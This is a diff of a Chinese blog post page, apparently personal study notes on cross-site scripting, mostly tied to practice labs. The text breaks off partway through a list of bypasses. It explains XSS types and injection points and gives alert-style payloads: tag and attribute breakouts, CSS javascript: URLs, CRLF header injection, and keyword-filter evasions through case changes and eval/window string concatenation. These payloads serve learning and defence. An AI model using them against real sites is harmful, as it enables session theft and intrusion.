@@ -1,13 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
 
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>2023/08/10：xss笔记 | Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="xss笔记原理将恶意脚本注入受害者浏览器，使其在浏览器中运行 分类1.存储型恶意代码上传至后端，当管理员查询信息时触发如：利用GET、POST或在Referer（xsslab 11）、Cookie（xsslab 13）植入2.反射型需要用户点击触发，在前端显示，一般盗取用户Cookie，较为常见如：假设有如下代码： 1&lt;?php echo $_GET[&amp;#x27;name&amp;#x27;]; ?">
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="xss笔记原理将恶意脚本注入受害者浏览器，使其在浏览器中运行 分类1.存储型恶意代码上传至后端，当管理员查询信息时触发如：利用GET、POST或在Referer（xsslab 11）、Cookie（xsslab 13）植入2.反射型需要用户点击触发，在前端显示，一般盗取用户Cookie，较为常见如：假设有如下代码： 1&lt;?php echo $_GET[&amp;#x27;name&amp;#x27;]; ?">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2023&#x2F;08&#x2F;10：xss笔记">
 <meta property="og:url" content="http://example.com/2023/08/10/xssnote/index.html">
@@ -17,173 +26,348 @@
 <meta property="article:published_time" content="2023-08-10T12:33:59.000Z">
 <meta property="article:modified_time" content="2023-08-10T12:42:45.830Z">
 <meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+<meta name="twitter:card" content="summary_large_image">
   
   
-    <link rel="icon" href="/favicon.png">
   
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+  <title>2023/08/10：xss笔记 - Hexo</title>
 
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
 <meta name="generator" content="Hexo 5.4.2"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main"><article id="post-xssnote" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/08/10/xssnote/" class="article-date">
-  <time datetime="2023-08-10T12:33:59.000Z" itemprop="datePublished">2023-08-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      2023/08/10：xss笔记
-    </h1>
   
 
-      </header>
+  <header>
     
-    <div class="article-entry" itemprop="articleBody">
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023/08/10：xss笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-10 20:33" pubdate>
+          August 10, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          91 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
       
-        <h2 id="xss笔记"><a href="#xss笔记" class="headerlink" title="xss笔记"></a>xss笔记</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>将恶意脚本注入受害者浏览器，使其在浏览器中运行</p>
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2023/08/10：xss笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="xss笔记"><a href="#xss笔记" class="headerlink" title="xss笔记"></a>xss笔记</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>将恶意脚本注入受害者浏览器，使其在浏览器中运行</p>
 <h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>1.存储型<br>恶意代码上传至后端，当管理员查询信息时触发<br>如：利用GET、POST或在Referer（xsslab 11）、Cookie（xsslab 13）植入<br>2.反射型<br>需要用户点击触发，在前端显示，一般盗取用户Cookie，较为常见<br>如：<br>假设有如下代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo $_GET[&#x27;name&#x27;]; ?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>恶意代码就可以通过GET显示在前端界面<br>3.DOM型<br>不经过后端，利用文档对象模型，属于较特殊的反射型xss<br>如：document.write()函数<br>（burplab好像不少这种题）<br>4.JSONP型<br>按原作者的话较为罕见，浏览器设置了CSP同源策略不允许调用其他域名API时，利用JSONP协议跨域加载特性在JSONP注入恶意代码<br>如：<br>API端口“<a target="_blank" rel="noopener" href="http://evi1s7.com/api%E2%80%9D%E8%BF%94%E5%9B%9E%E5%A6%82%E4%B8%8BJSONP%E5%93%8D%E5%BA%94%EF%BC%9A">http://Evi1s7.com/api”返回如下JSONP响应：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(&#123; &quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30 &#125;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">callback</span><span class="hljs-params">(&#123; <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span> &#125;)</span></span><br></code></pre></td></tr></table></figure>
 <p>可构造如下url执行脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://Evi1s7.com/api?callback=attackerFunction</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>Evi1s7.com/api?callback=attackerFunction<br></code></pre></td></tr></table></figure>
 <p>这样返回的JSONP响应发生修改：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacjerFunction(&#123; &quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30 &#125;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">attacjerFunction</span>(&#123; <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span> &#125;);<br></code></pre></td></tr></table></figure>
 <p>就可以在页面定义attacjerFunction注入恶意脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function attackerFunction(data) &#123;</span><br><span class="line">  document.cookie = &quot;sessionID=&quot; + data.name;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">function</span> <span class="hljs-title function_">attackerFunction</span>(<span class="hljs-params">data</span>) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery"> <span class="hljs-built_in"> document</span>.cookie = <span class="hljs-string">&quot;sessionID=&quot;</span> + data<span class="hljs-built_in">.name</span>;</span><br><span class="language-xquery">&#125;</span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
 <h3 id="攻击对象"><a href="#攻击对象" class="headerlink" title="攻击对象"></a>攻击对象</h3><p>又名把xss插到哪</p>
 <h4 id="HTML的注释"><a href="#HTML的注释" class="headerlink" title="HTML的注释"></a>HTML的注释</h4><p>如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 2333 --&gt;</span><br><span class="line">&lt;!-- </span><br><span class="line">&lt;script&gt;</span><br><span class="line">  alert(&#x27;1&#x27;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 2333 --&gt;</span><br><span class="hljs-comment">&lt;!-- </span><br><span class="hljs-comment">&lt;script&gt;</span><br><span class="hljs-comment">  alert(&#x27;1&#x27;);</span><br><span class="hljs-comment">&lt;/script&gt;</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure>
 <h4 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h4><p>例如将代码插入到标签的onerror属性中，无法显示图片时就会调用该代码</p>
 <h4 id="HTML属性名"><a href="#HTML属性名" class="headerlink" title="HTML属性名"></a>HTML属性名</h4><p>利用闭合的方式可以插入属性名执行<br>如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; onclick=&quot;alert(&#x27;1&#x27;)&quot; name=&quot;&gt;&lt;script&gt;alert(&#x27;XSS攻击成功！&#x27;)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;1&#x27;)&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS攻击成功！&#x27;)&lt;/script&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
 <p>插入后前半部分完整，可以执行后半部分的脚本</p>
-<h4 id="HTML标签名"><a href="#HTML标签名" class="headerlink" title="HTML标签名"></a>HTML标签名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;script&gt;alert(&#x27;1&#x27;)&lt;/script&gt;img src=1&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="HTML标签名"><a href="#HTML标签名" class="headerlink" title="HTML标签名"></a>HTML标签名</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;1&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>img src=1&gt;<br></code></pre></td></tr></table></figure>
 <p>这段代码中，浏览器会将第一个尖括号视为标签名的起始符号，而第二个尖括号则是script标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现我们的XSS攻击</p>
 <h4 id="直接插入"><a href="#直接插入" class="headerlink" title="直接插入"></a>直接插入</h4><p>直接插入script，不带改的</p>
-<h4 id="插入css"><a href="#插入css" class="headerlink" title="插入css"></a>插入css</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(&#x27;javascript:alert(&#x27;1&#x27;)&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="插入css"><a href="#插入css" class="headerlink" title="插入css"></a>插入css</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;background-image:url(&#x27;javascript:alert(&#x27;1&#x27;)&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
 <p>当css样式能插入url时，用户打开这个界面浏览器就会执行脚本</p>
 <h4 id="插入响应（HTTP报头注入）"><a href="#插入响应（HTTP报头注入）" class="headerlink" title="插入响应（HTTP报头注入）"></a>插入响应（HTTP报头注入）</h4><p>利用报头注入漏洞通过注入CRLF字符（回车、换行）向HTTP响应注入任意HTTP头或响应体，来改变响应内容<br>如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp:?key=aaa</span><br></pre></td></tr></table></figure>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">exp</span>:?<span class="hljs-built_in">key</span>=aaa<br></code></pre></td></tr></table></figure>
 <p>若该利用GET的形式传参的网站存在CRLF漏洞，那么我们就可以利用回车符/换行符进行绕过过滤</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=%0d%0a%0d%0a&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">key</span>=%0d%0a%0d%0a&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br></code></pre></td></tr></table></figure>
 <p>返回包如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date:xxxxxxxxxx</span><br><span class="line"></span><br><span class="line">Content-type:text/html</span><br><span class="line"></span><br><span class="line">Contet-Length:xxx</span><br><span class="line"></span><br><span class="line">Connection:close</span><br><span class="line"></span><br><span class="line">Location:</span><br><span class="line"></span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><br><span class="language-arcade"><span class="hljs-built_in">Date</span>:xxxxxxxxxx</span><br><span class="language-arcade"></span><br><span class="language-arcade">Content-type:<span class="hljs-built_in">text</span>/html</span><br><span class="language-arcade"></span><br><span class="language-arcade">Contet-<span class="hljs-built_in">Length</span>:xxx</span><br><span class="language-arcade"></span><br><span class="language-arcade">Connection:close</span><br><span class="language-arcade"></span><br><span class="language-arcade">Location:</span><br><span class="language-arcade"></span><br><span class="language-arcade">&lt;img src=<span class="hljs-number">1</span> onerror=alert(<span class="hljs-regexp">/xss/</span>)&gt;</span><br></code></pre></td></tr></table></figure>
 <p>http包分为了header和body，成功执行了body中的代码，实现XSS</p>
 <h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h4><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>如xsslab第6题</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br></pre></td></tr></table></figure>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>]<span class="hljs-comment">;</span><br>$str2=str_replace(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,$str)<span class="hljs-comment">;</span><br>$str3=str_replace(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2)<span class="hljs-comment">;</span><br>$str4=str_replace(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3)<span class="hljs-comment">;</span><br>$str5=str_replace(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4)<span class="hljs-comment">;</span><br>$str6=str_replace(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
 <p>str_replace()需要区分大小写</p>
 <h5 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h5><p>1.eval</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
 <p>2.top</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
 <p>3.window</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
 <p>4.self</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;self[`al`+`ert`](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
 <p>5.parent</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;parent[`al`+`ert`](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
 <p>6.frames</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
